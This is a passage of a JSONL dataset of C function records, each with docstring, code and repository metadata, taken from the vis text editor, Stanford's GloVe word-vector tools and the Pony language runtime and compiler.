false;\n\n\t\tstruct stat meta;\n\t\tbool existing_file = !stat(path, &meta);\n\t\tbool same_file = existing_file && file->name &&\n\t\t                 file->stat.st_dev == meta.st_dev && file->stat.st_ino == meta.st_ino;\n\n\t\tif (cmd->flags != '!') {\n\t\t\tif (same_file && file->stat.st_mtime && file->stat.st_mtime < meta.st_mtime) {\n\t\t\t\tvis_info_show(vis, \"WARNING: file has been changed since reading it\");\n\t\t\t\tgoto err;\n\t\t\t}\n\t\t\tif (existing_file && !same_file) {\n\t\t\t\tvis_info_show(vis, \"WARNING: file exists\");\n\t\t\t\tgoto err;\n\t\t\t}\n\t\t}\n\n\t\tif (!vis_event_emit(vis, VIS_EVENT_FILE_SAVE_PRE, file, path) && cmd->flags != '!') {\n\t\t\tvis_info_show(vis, \"Rejected write to `%s' by pre-save hook\", path);\n\t\t\tgoto err;\n\t\t}\n\t\t/* a pre-save hook may have changed the text; need to re-take the range */\n\t\tif (write_entire_file)\n\t\t\t*r = text_range_new(0, text_size(text));\n\n\t\tTextSave *ctx = text_save_begin(text, AT_FDCWD, path, file->save_method);\n\t\tif (!ctx) {\n\t\t\tconst char *msg = errno ? strerror(errno) : \"try changing `:set savemethod`\";\n\t\t\tvis_info_show(vis, \"Can't write `%s': %s\", path, msg);\n\t\t\tgoto err;\n\t\t}\n\n\t\tbool failure = false;\n\t\tbool visual = vis->mode->visual;\n\n\t\tfor (Selection *s = view_selections(win->view); s; s = view_selections_next(s)) {\n\t\t\tFilerange range = visual ? view_selections_get(s) : *r;\n\t\t\tssize_t written = text_save_write_range(ctx, &range);\n\t\t\tfailure = (written == -1 || (size_t)written != text_range_size(&range));\n\t\t\tif (failure) {\n\t\t\t\ttext_save_cancel(ctx);\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tif (!visual)\n\t\t\t\tbreak;\n\t\t}\n\n\t\tif (failure || !text_save_commit(ctx)) {\n\t\t\tvis_info_show(vis, \"Can't write `%s': %s\", path, strerror(errno));\n\t\t\tgoto err;\n\t\t}\n\n\t\tif (!file->name) {\n\t\t\tfile_name_set(file, path);\n\t\t\tsame_file = true;\n\t\t}\n\t\tif (same_file || (!existing_file && strcmp(file->name, path) == 0))\n\t\t\tfile->stat = text_stat(text);\n\t\tvis_event_emit(vis, VIS_EVENT_FILE_SAVE_POST, file, path);\n\t\tfree(path);\n\t\tcontinue;\n\n\terr:\n\t\tfree(path);\n\t\treturn false;\n\t}\n\treturn true;\n}", "path": "vis/sam.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "// TODO: specify this per file type?\n", "func_signal": "int is_word_boundary(int c)", "code": "{\n\treturn ISASCII(c) && !(('0' <= c && c <= '9') ||\n\t         ('a' <= c && c <= 'z') ||\n\t         ('A' <= c && c <= 'Z') || c == '_');\n}", "path": "vis/text-motions.c", "commit_date": "2020-09-17 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* delete data from a block at an arbitrary position, this should only be used with\n * data of the most recently created piece. */\n", "func_signal": "bool block_delete(Block *blk, size_t pos, size_t len)", "code": "{\n\tsize_t end;\n\tif (!addu(pos, len, &end) || end > blk->len)\n\t\treturn false;\n\tif (blk->len == pos) {\n\t\tblk->len -= len;\n\t\treturn true;\n\t}\n\tchar *delete = blk->data + pos;\n\tmemmove(delete, delete + len, blk->len - pos - len);\n\tblk->len -= len;\n\treturn true;\n}", "path": "vis/text-io.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "martanne/vis", "stars": 4133, "license": "other", "language": "c", "size": 5588}
{"docstring": "/* Write contents of array to binary file */\n", "func_signal": "int write_chunk(CREC *array, long size, FILE *fout)", "code": "{\n    long i = 0;\n    for (i = 0; i < size; i++) fwrite(&array[i], sizeof(CREC), 1, fout);\n    return 0;\n}", "path": "GloVe/src/shuffle.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Shuffle large input stream by splitting into chunks */\n", "func_signal": "int shuffle_by_chunks()", "code": "{\n    if (seed == 0) {\n        seed = time(0);\n    }\n    fprintf(stderr, \"Using random seed %d\\n\", seed);\n    srand(seed);\n    long i = 0, l = 0;\n    int fidcounter = 0;\n    char filename[MAX_STRING_LENGTH];\n    CREC *array;\n    FILE *fin = stdin, *fid;\n    array = malloc(sizeof(CREC) * array_size);\n    \n    fprintf(stderr,\"SHUFFLING COOCCURRENCES\\n\");\n    if (verbose > 0) fprintf(stderr,\"array size: %lld\\n\", array_size);\n    sprintf(filename,\"%s_%04d.bin\",file_head, fidcounter);\n    fid = fopen(filename,\"w\");\n    if (fid == NULL) {\n        log_file_loading_error(\"file\", filename);\n        free(array);\n        return 1;\n    }\n    if (verbose > 1) fprintf(stderr, \"Shuffling by chunks: processed 0 lines.\");\n    \n    while (1) { //Continue until EOF\n        if (i >= array_size) {// If array is full, shuffle it and save to temporary file\n            shuffle(array, i-2);\n            l += i;\n            if (verbose > 1) fprintf(stderr, \"\\033[22Gprocessed %ld lines.\", l);\n            write_chunk(array,i,fid);\n            fclose(fid);\n            fidcounter++;\n            sprintf(filename,\"%s_%04d.bin\",file_head, fidcounter);\n            fid = fopen(filename,\"w\");\n            if (fid == NULL) {\n                log_file_loading_error(\"file\", filename);\n                free(array);\n                return 1;\n            }\n            i = 0;\n        }\n        fread(&array[i], sizeof(CREC), 1, fin);\n        if (feof(fin)) break;\n        i++;\n    }\n    shuffle(array, i-2); //Last chunk may be smaller than array_size\n    write_chunk(array,i,fid);\n    l += i;\n    if (verbose > 1) fprintf(stderr, \"\\033[22Gprocessed %ld lines.\\n\", l);\n    if (verbose > 1) fprintf(stderr, \"Wrote %d temporary file(s).\\n\", fidcounter + 1);\n    fclose(fid);\n    free(array);\n    return shuffle_merge(fidcounter + 1); // Merge and shuffle together temporary files\n}", "path": "GloVe/src/shuffle.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Vocab frequency comparison; break ties alphabetically */\n", "func_signal": "int CompareVocabTie(const void *a, const void *b)", "code": "{\n    long long c;\n    if ( (c = ((VOCAB *) b)->count - ((VOCAB *) a)->count) != 0) return ( c > 0 ? 1 : -1 );\n    else return (scmp(((VOCAB *) a)->word,((VOCAB *) b)->word));\n    \n}", "path": "GloVe/src/vocab_count.c", "commit_date": "2020-04-10 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Write sorted chunk of cooccurrence records to file, accumulating duplicate entries */\n", "func_signal": "int write_chunk(CREC *cr, long long length, FILE *fout)", "code": "{\n    if (length == 0) return 0;\n\n    long long a = 0;\n    CREC old = cr[a];\n    \n    for (a = 1; a < length; a++) {\n        if (cr[a].word1 == old.word1 && cr[a].word2 == old.word2) {\n            old.val += cr[a].val;\n            continue;\n        }\n        fwrite(&old, sizeof(CREC), 1, fout);\n        old = cr[a];\n    }\n    fwrite(&old, sizeof(CREC), 1, fout);\n    return 0;\n}", "path": "GloVe/src/cooccur.c", "commit_date": "2020-02-11 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Insert entry into priority queue */\n", "func_signal": "void insert(CRECID *pq, CRECID new, int size)", "code": "{\n    int j = size - 1, p;\n    pq[j] = new;\n    while ( (p=(j-1)/2) >= 0 ) {\n        if (compare_crecid(pq[p],pq[j]) > 0) {swap_entry(pq,p,j); j = p;}\n        else break;\n    }\n}", "path": "GloVe/src/cooccur.c", "commit_date": "2020-02-11 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Write top node of priority queue to file, accumulating duplicate entries */\n", "func_signal": "int merge_write(CRECID new, CRECID *old, FILE *fout)", "code": "{\n    if (new.word1 == old->word1 && new.word2 == old->word2) {\n        old->val += new.val;\n        return 0; // Indicates duplicate entry\n    }\n    fwrite(old, sizeof(CREC), 1, fout);\n    *old = new;\n    return 1; // Actually wrote to file\n}", "path": "GloVe/src/cooccur.c", "commit_date": "2020-02-11 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Simple bitwise hash function */\n", "func_signal": "unsigned int bitwisehash(char *word, int tsize, unsigned int seed)", "code": "{\n    char c;\n    unsigned int h;\n    h = seed;\n    for ( ; (c = *word) != '\\0'; word++) h ^= ((h << 5) + c + (h >> 2));\n    return (unsigned int)((h & 0x7fffffff) % tsize);\n}", "path": "GloVe/src/common.c", "commit_date": "2020-02-11 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Vocab frequency comparison; no tie-breaker */\n", "func_signal": "int CompareVocab(const void *a, const void *b)", "code": "{\n    long long c;\n    if ( (c = ((VOCAB *) b)->count - ((VOCAB *) a)->count) != 0) return ( c > 0 ? 1 : -1 );\n    else return 0;\n}", "path": "GloVe/src/vocab_count.c", "commit_date": "2020-04-10 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Check if two cooccurrence records are for the same two words */\n", "func_signal": "int compare_crecid(CRECID a, CRECID b)", "code": "{\n    int c;\n    if ( (c = a.word1 - b.word1) != 0) return c;\n    else return a.word2 - b.word2;\n}", "path": "GloVe/src/cooccur.c", "commit_date": "2020-02-11 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Fisher-Yates shuffle */\n", "func_signal": "void shuffle(CREC *array, long n)", "code": "{\n    long i, j;\n    CREC tmp;\n    for (i = n - 1; i > 0; i--) {\n        j = rand_long(i + 1);\n        tmp = array[j];\n        array[j] = array[i];\n        array[i] = tmp;\n    }\n}", "path": "GloVe/src/shuffle.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Read word from input stream. Return 1 when encounter '\\n' or EOF (but separate from word), 0 otherwise.\n   Words can be separated by space(s), tab(s), or newline(s). Carriage return characters are just ignored.\n   (Okay for Windows, but not for Mac OS 9-. Ignored even if by themselves or in words.)\n   A newline is taken as indicating a new document (contexts won't cross newline).\n   Argument word array is assumed to be of size MAX_STRING_LENGTH.\n   words will be truncated if too long. They are truncated with some care so that they\n   cannot truncate in the middle of a utf-8 character, but\n   still little to no harm will be done for other encodings like iso-8859-1.\n   (This function appears identically copied in vocab_count.c and cooccur.c.)\n */\n", "func_signal": "int get_word(char *word, FILE *fin)", "code": "{\n    int i = 0, ch;\n    for ( ; ; ) {\n        ch = fgetc(fin);\n        if (ch == '\\r') continue;\n        if (i == 0 && ((ch == '\\n') || (ch == EOF))) {\n            word[i] = 0;\n            return 1;\n        }\n        if (i == 0 && ((ch == ' ') || (ch == '\\t'))) continue; // skip leading space\n        if ((ch == EOF) || (ch == ' ') || (ch == '\\t') || (ch == '\\n')) {\n            if (ch == '\\n') ungetc(ch, fin); // return the newline next time as document ender\n            break;\n        }\n        if (i < MAX_STRING_LENGTH - 1)\n          word[i++] = ch; // don't allow words to exceed MAX_STRING_LENGTH\n    }\n    word[i] = 0; //null terminate\n    // avoid truncation destroying a multibyte UTF-8 char except if only thing on line (so the i > x tests won't overwrite word[0])\n    // see https://en.wikipedia.org/wiki/UTF-8#Description\n    if (i == MAX_STRING_LENGTH - 1 && (word[i-1] & 0x80) == 0x80) {\n        if ((word[i-1] & 0xC0) == 0xC0) {\n            word[i-1] = '\\0';\n        } else if (i > 2 && (word[i-2] & 0xE0) == 0xE0) {\n            word[i-2] = '\\0';\n        } else if (i > 3 && (word[i-3] & 0xF8) == 0xF0) {\n            word[i-3] = '\\0';\n        }\n    }\n    return 0;\n}", "path": "GloVe/src/common.c", "commit_date": "2020-02-11 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Search hash table for given string, insert if not found */\n", "func_signal": "void hashinsert(HASHREC **ht, char *w)", "code": "{\n    HASHREC     *htmp, *hprv;\n    unsigned int hval = HASHFN(w, TSIZE, SEED);\n    \n    for (hprv = NULL, htmp = ht[hval]; htmp != NULL && scmp(htmp->word, w) != 0; hprv = htmp, htmp = htmp->next);\n    if (htmp == NULL) {\n        htmp = (HASHREC *) malloc( sizeof(HASHREC) );\n        htmp->word = (char *) malloc( strlen(w) + 1 );\n        strcpy(htmp->word, w);\n        htmp->num = 1;\n        htmp->next = NULL;\n        if ( hprv==NULL )\n            ht[hval] = htmp;\n        else\n            hprv->next = htmp;\n    }\n    else {\n        /* new records are not moved to front */\n        htmp->num++;\n        if (hprv != NULL) {\n            /* move to front on access */\n            hprv->next = htmp->next;\n            htmp->next = ht[hval];\n            ht[hval] = htmp;\n        }\n    }\n    return;\n}", "path": "GloVe/src/vocab_count.c", "commit_date": "2020-04-10 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Efficient string comparison */\n", "func_signal": "int scmp( char *s1, char *s2 )", "code": "{\n    while (*s1 != '\\0' && *s1 == *s2) {s1++; s2++;}\n    return (*s1 - *s2);\n}", "path": "GloVe/src/common.c", "commit_date": "2020-02-11 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Check if two cooccurrence records are for the same two words, used for qsort */\n", "func_signal": "int compare_crec(const void *a, const void *b)", "code": "{\n    int c;\n    if ( (c = ((CREC *) a)->word1 - ((CREC *) b)->word1) != 0) return c;\n    else return (((CREC *) a)->word2 - ((CREC *) b)->word2);\n    \n}", "path": "GloVe/src/cooccur.c", "commit_date": "2020-02-11 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Merge shuffled temporary files; doesn't necessarily produce a perfect shuffle, but good enough */\n", "func_signal": "int shuffle_merge(int num)", "code": "{\n    long i, j, k, l = 0;\n    int fidcounter = 0;\n    CREC *array;\n    char filename[MAX_STRING_LENGTH];\n    FILE **fid, *fout = stdout;\n    \n    array = malloc(sizeof(CREC) * array_size);\n    fid = calloc(num, sizeof(FILE));\n    for (fidcounter = 0; fidcounter < num; fidcounter++) { //num = number of temporary files to merge\n        sprintf(filename,\"%s_%04d.bin\",file_head, fidcounter);\n        fid[fidcounter] = fopen(filename, \"rb\");\n        if (fid[fidcounter] == NULL) {\n            log_file_loading_error(\"temp file\", filename);\n            free(array);\n            free_fid(fid, num);\n            return 1;\n        }\n    }\n    if (verbose > 0) fprintf(stderr, \"Merging temp files: processed %ld lines.\", l);\n    \n    while (1) { //Loop until EOF in all files\n        i = 0;\n        //Read at most array_size values into array, roughly array_size/num from each temp file\n        for (j = 0; j < num; j++) {\n            if (feof(fid[j])) continue;\n            for (k = 0; k < array_size / num; k++){\n                fread(&array[i], sizeof(CREC), 1, fid[j]);\n                if (feof(fid[j])) break;\n                i++;\n            }\n        }\n        if (i == 0) break;\n        l += i;\n        shuffle(array, i-1); // Shuffles lines between temp files\n        write_chunk(array,i,fout);\n        if (verbose > 0) fprintf(stderr, \"\\033[31G%ld lines.\", l);\n    }\n    fprintf(stderr, \"\\033[0GMerging temp files: processed %ld lines.\", l);\n    for (fidcounter = 0; fidcounter < num; fidcounter++) {\n        fclose(fid[fidcounter]);\n        sprintf(filename,\"%s_%04d.bin\",file_head, fidcounter);\n        remove(filename);\n    }\n    fprintf(stderr, \"\\n\\n\");\n    free(array);\n    free(fid);\n    return 0;\n}", "path": "GloVe/src/shuffle.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Generate uniformly distributed random long ints */\n", "func_signal": "static long rand_long(long n)", "code": "{\n    long limit = LRAND_MAX - LRAND_MAX % n;\n    long rnd;\n    do {\n        rnd = ((long)RAND_MAX + 1) * (long)rand() + (long)rand();\n    } while (rnd >= limit);\n    return rnd % n;\n}", "path": "GloVe/src/shuffle.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Create hash table, initialise pointers to NULL */\n", "func_signal": "HASHREC ** inithashtable()", "code": "{\n    int i;\n    HASHREC **ht;\n    ht = (HASHREC **) malloc( sizeof(HASHREC *) * TSIZE );\n    for (i = 0; i < TSIZE; i++) ht[i] = (HASHREC *) NULL;\n    return ht;\n}", "path": "GloVe/src/common.c", "commit_date": "2020-02-11 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Delete entry from priority queue */\n", "func_signal": "void delete(CRECID *pq, int size)", "code": "{\n    int j, p = 0;\n    pq[p] = pq[size - 1];\n    while ( (j = 2*p+1) < size - 1 ) {\n        if (j == size - 2) {\n            if (compare_crecid(pq[p],pq[j]) > 0) swap_entry(pq,p,j);\n            return;\n        }\n        else {\n            if (compare_crecid(pq[j], pq[j+1]) < 0) {\n                if (compare_crecid(pq[p],pq[j]) > 0) {swap_entry(pq,p,j); p = j;}\n                else return;\n            }\n            else {\n                if (compare_crecid(pq[p],pq[j+1]) > 0) {swap_entry(pq,p,j+1); p = j + 1;}\n                else return;\n            }\n        }\n    }\n}", "path": "GloVe/src/cooccur.c", "commit_date": "2020-02-11 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Search hash table for given string, return record if found, else NULL */\n", "func_signal": "HASHREC *hashsearch(HASHREC **ht, char *w)", "code": "{\n    HASHREC     *htmp, *hprv;\n    unsigned int hval = HASHFN(w, TSIZE, SEED);\n    for (hprv = NULL, htmp=ht[hval]; htmp != NULL && scmp(htmp->word, w) != 0; hprv = htmp, htmp = htmp->next);\n    if ( htmp != NULL && hprv!=NULL ) { // move to front on access\n        hprv->next = htmp->next;\n        htmp->next = ht[hval];\n        ht[hval] = htmp;\n    }\n    return(htmp);\n}", "path": "GloVe/src/cooccur.c", "commit_date": "2020-02-11 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/* Swap two entries of priority queue */\n", "func_signal": "void swap_entry(CRECID *pq, int i, int j)", "code": "{\n    CRECID temp = pq[i];\n    pq[i] = pq[j];\n    pq[j] = temp;\n}", "path": "GloVe/src/cooccur.c", "commit_date": "2020-02-11 00:00:00", "repo_name": "stanfordnlp/GloVe", "stars": 6634, "license": "apache-2.0", "language": "c", "size": 239}
{"docstring": "/**\n * If we can terminate, return true. If all schedulers are waiting, one of\n * them will stop the ASIO back end and tell the cycle detector to try to\n * terminate.\n */\n", "func_signal": "static bool quiescent(scheduler_t* sched, uint64_t tsc, uint64_t tsc2)", "code": "{\n  if(sched->terminate)\n    return true;\n\n  uint32_t current_active_scheduler_count = get_active_scheduler_count();\n\n  if(sched->ack_count >= current_active_scheduler_count)\n  {\n    // mark last cycle detector tsc as something huge to ensure\n    // cycle detector will not get triggered\n    // this is required to ensure scheduler queues are empty\n    // upon termination\n    uint64_t saved_last_cd_tsc = last_cd_tsc;\n    last_cd_tsc = -1;\n\n    if(sched->asio_stoppable && ponyint_asio_stop())\n    {\n      // successfully stopped ASIO thread\n      // tell all scheduler threads to terminate\n      send_msg_all(sched->index, SCHED_TERMINATE, 0);\n\n      wake_suspended_threads(sched->index);\n\n      sched->ack_token++;\n      sched->ack_count = 0;\n    } else if(ponyint_asio_stoppable()) {\n      sched->asio_stoppable = true;\n      sched->ack_token++;\n      sched->ack_count = 0;\n\n      // Run another CNF/ACK cycle.\n      send_msg_all_active(sched->index, SCHED_CNF, sched->ack_token);\n\n      // restore last cycle detector tsc to re-enable cycle detector\n      // triggering\n      last_cd_tsc = saved_last_cd_tsc;\n    } else {\n      // ASIO is not stoppable\n      sched->asio_stoppable = false;\n\n      // restore last cycle detector tsc to re-enable cycle detector\n      // triggering\n      last_cd_tsc = saved_last_cd_tsc;\n    }\n  }\n\n  ponyint_cpu_core_pause(tsc, tsc2, use_yield);\n  return false;\n}", "path": "ponyc/src/libponyrt/sched/scheduler.c", "commit_date": "2020-09-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "/**\n * Sends a message to a thread.\n */\n", "func_signal": "static void send_msg(uint32_t from, uint32_t to, sched_msg_t msg, intptr_t arg)", "code": "{\n  pony_msgi_t* m = (pony_msgi_t*)pony_alloc_msg(\n    POOL_INDEX(sizeof(pony_msgi_t)), msg);\n\n#ifdef USE_MEMTRACK_MESSAGES\n  this_scheduler->ctx.num_messages--;\n  this_scheduler->ctx.mem_used_messages += sizeof(pony_msgi_t);\n  this_scheduler->ctx.mem_used_messages -= POOL_ALLOC_SIZE(pony_msgi_t);\n#endif\n\n  m->i = arg;\n  ponyint_thread_messageq_push(&scheduler[to].mq, &m->msg, &m->msg\n#ifdef USE_DYNAMIC_TRACE\n    , from, to\n#endif\n    );\n  (void)from;\n}", "path": "ponyc/src/libponyrt/sched/scheduler.c", "commit_date": "2020-09-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// The resulting eph will always be TK_EPHEMERAL or TK_NONE.\n", "func_signal": "static void cap_aliasing(token_id* cap, token_id* eph)", "code": "{\n  switch(*eph)\n  {\n    case TK_EPHEMERAL:\n      switch(*cap)\n      {\n        case TK_ISO:\n        case TK_TRN:\n        case TK_CAP_SEND:\n        case TK_CAP_ANY:\n          break;\n\n        default:\n          // Everything else unaliases as itself, so use TK_NONE.\n          *eph = TK_NONE;\n      }\n      break;\n\n    case TK_ALIASED:\n      switch(*cap)\n      {\n        case TK_ISO:\n          // Alias as tag.\n          *cap = TK_TAG;\n          break;\n\n        case TK_TRN:\n          // Alias as box.\n          *cap = TK_BOX;\n          break;\n\n        case TK_CAP_SEND:\n          // Alias as #share.\n          *cap = TK_CAP_SHARE;\n          break;\n\n        case TK_CAP_ANY:\n          // Alias as #alias.\n          *cap = TK_CAP_ALIAS;\n          break;\n\n        default: {}\n      }\n\n      *eph = TK_NONE;\n      break;\n\n    default: {}\n  }\n}", "path": "ponyc/src/libponyc/type/cap.c", "commit_date": "2020-08-21 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Maybe wake up a scheduler thread if possible\n", "func_signal": "void ponyint_sched_maybe_wakeup_if_all_asleep(int32_t current_scheduler_id)", "code": "{\n  uint32_t current_active_scheduler_count = get_active_scheduler_count();\n\n  // wake up threads if the current active count is 0\n  // keep trying until successful to avoid deadlock\n  while((current_active_scheduler_count = get_active_scheduler_count()) == 0)\n  {\n    ponyint_sched_maybe_wakeup(current_scheduler_id);\n\n    current_active_scheduler_count = get_active_scheduler_count();\n\n    if(current_active_scheduler_count >= 1)\n    {\n      // wait for sleeping threads to wake and update check variable\n      // to ensure that we have at least one fully awake scheduler thread\n      while (get_active_scheduler_count() != get_active_scheduler_count_check())\n      {\n        // send signals to all scheduler threads that should be awake\n        // this is somewhat wasteful if a scheduler thread is already awake\n        // but is necessary in case the signal to wake a thread was missed\n        // NOTE: this intentionally allows for the case where some scheduler\n        // threads might miss the signal and not wake up. That is handled in\n        // by a combination of the check variable and this while loop\n        signal_suspended_threads(current_active_scheduler_count, current_scheduler_id);\n      }\n    }\n  }\n}", "path": "ponyc/src/libponyrt/sched/scheduler.c", "commit_date": "2020-09-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Add the given new BNF node to the given parent.\n// New children go at the end of the child list.\n", "func_signal": "static bnf_t* bnf_add(bnf_t* bnf, bnf_t* parent)", "code": "{\n  pony_assert(bnf != NULL);\n  pony_assert(parent != NULL);\n\n  if(parent->last_child == NULL)  // First node in list\n    parent->child = bnf;\n  else\n    parent->last_child->sibling = bnf;\n\n  parent->last_child = bnf;\n  return bnf;\n}", "path": "ponyc/src/libponyc/ast/bnfprint.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "// Simplify the children of the given node, removing any that never match or do\n// nothing.\n// The out_changed variable is set to true when any simplifications occur.\n", "func_signal": "static void bnf_simplify_children(bnf_t* tree, bnf_t* parent, bool* out_never,\n  bool* out_nop, bool *out_changed)", "code": "{\n  pony_assert(parent != NULL);\n\n  if(out_never != NULL) *out_never = false;\n  if(out_nop != NULL) *out_nop = false;\n\n  // Run through the child list\n  bnf_t* prev = NULL;\n  bnf_t* p = parent->child;\n\n  while(p != NULL)\n  {\n    // Simplify the child\n    bnf_simplify_node(tree, p, out_changed);\n\n    if(p->id == BNF_NEVER && out_never != NULL)\n      *out_never = true;\n\n    if(p->id == BNF_NOP && out_nop != NULL)\n      *out_nop = true;\n\n    if(p->id == BNF_NEVER || p->id == BNF_NOP)\n    {\n      // Remove this child\n      if(prev == NULL)  // Removing first node in list\n        parent->child = p->sibling;\n      else\n        prev->sibling = p->sibling;\n\n      bnf_t* next = p->sibling;\n      p->sibling = NULL;\n      bnf_free(p);\n      p = next;\n      *out_changed = true;\n    }\n    else\n    {\n      prev = p;\n      p = p->sibling;\n    }\n  }\n\n  parent->last_child = prev;\n}", "path": "ponyc/src/libponyc/ast/bnfprint.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "ponylang/ponyc", "stars": 5571, "license": "bsd-2-clause", "language": "c", "size": 19291}
{"docstring": "/**\n * Suspend this thread for some time, including no sleep at all if\n * pop_global() can give us an actor immediately.\n *\n * WARNING: suspend_scheduler must be called in critical section\n *          protected by sched_mut/scheduler_count_changing,\n *          and we return with that mechanism:\n *            * Pthreads: locked, because pthread_thread_suspend() does\n *              not permit a choice to avoid reacquiring the mutex.\n *            * Non-Pthreads: unlocked, because after the suspend,\n *              we only need to reacquire in special case of\n *              sched->index==0.\n */\n", "func_signal": "static pony_actor_t* suspend_scheduler(scheduler_t* sched,\n  uint32_t current_active_scheduler_count)", "code": "{\n  pony_actor_t* actor = NULL;\n\n  // decrement active_scheduler_count so other schedulers know we're\n  // sleeping\n  uint32_t sched_count = get_active_scheduler_count();\n\n  // make sure the scheduler count didn't change\n  // if it did, then another thread resumed and it may not be\n  // appropriate for us to suspend any longer, so don't suspend\n  if(sched_count != current_active_scheduler_count) {\n#if !defined(USE_SCHEDULER_SCALING_PTHREADS)\n    atomic_store_explicit(&scheduler_count_changing, false,\n      memory_order_release);\n#endif\n    return actor;\n  }\n\n  atomic_store_explicit(&active_scheduler_count, sched_count - 1,\n    memory_order_relaxed);\n\n  // decrement active_scheduler_count_check\n  uint32_t sched_count_check = get_active_scheduler_count_check();\n\n  atomic_store_explicit(&active_scheduler_count_check, sched_count_check - 1,\n    memory_order_relaxed);\n\n  // ensure main active scheduler count and check variable match\n  pony_assert(sched_count == sched_count_check);\n\n#if !defined(USE_SCHEDULER_SCALING_PTHREADS)\n  // unlock the bool that controls modifying the active scheduler count\n  // variable if using signals\n  atomic_store_explicit(&scheduler_count_changing, false,\n    memory_order_release);\n#endif\n\n  // let sched 0 know we're suspending only after decrementing\n  // active_scheduler_count to avoid a race condition between\n  // when we update active_scheduler_count and scheduler 0 processes\n  // the SCHED_SUSPEND message we send it. If we don't do this,\n  // and scheduler 0 processes the SCHED_SUSPEND message before we\n  // decrement active_scheduler_count, it could think that\n  // active_scheduler_count > block_count and not start the CNF/ACK\n  // process for termination and potentiall hang the runtime instead\n  // of allowing it to reach quiescence.\n  if(sched->index != 0)\n    send_msg(sched->index, 0, SCHED_SUSPEND, 0);\n\n  // dtrace suspend notification\n  DTRACE1(THREAD_SUSPEND, (uintptr_t)sched);\n\n  while(get_active_scheduler_count() <= (uint32_t)sched->index)\n  {\n    // if we're scheduler 0 with noisy actors check to make\n    // sure inject queue is empty to avoid race condition\n    // between thread 0 sleeping and the ASIO thread getting a\n    // new event\n    if(sched->index == 0)\n    {\n      actor = pop_global(NULL);\n      if(actor != NULL)\n        break;\n\n      if(read_msg(sched))\n      {\n        // An actor was unmuted and added to our run queue. Pop it and return.\n        // Effectively, we are \"stealing\" from ourselves. We need to verify that\n        // popping succeeded (actor != NULL) as some other scheduler might have\n        // stolen the newly scheduled actor from us already. Schedulers, what a\n        // bunch of thieving bastards!\n        actor = pop_global(sched);\n        if(actor != NULL)\n          break;\n      }\n\n      // if ASIO is no longer noisy due to reading a message from the ASIO\n      // thread\n      if(!sched->asio_noisy)\n        break;\n    }\n\n    // sleep waiting for signal to wake up again\n#if defined(USE_SCHEDULER_SCALING_PTHREADS)\n    ponyint_thread_suspend(sched->sleep_object, &sched_mut);\n#else\n    ponyint_thread_suspend(sched->sleep_object);\n#endif\n  }\n\n  // dtrace resume notification\n  DTRACE1(THREAD_RESUME, (uintptr_t)sched);\n\n#if !defined(USE_SCHEDULER_SCALING_PTHREADS)\n  // When using signals, need to acquire sched count changing variable\n  while (true)\n  {\n    // get the bool that controls modifying the active scheduler\n    // count variable if using signals\n    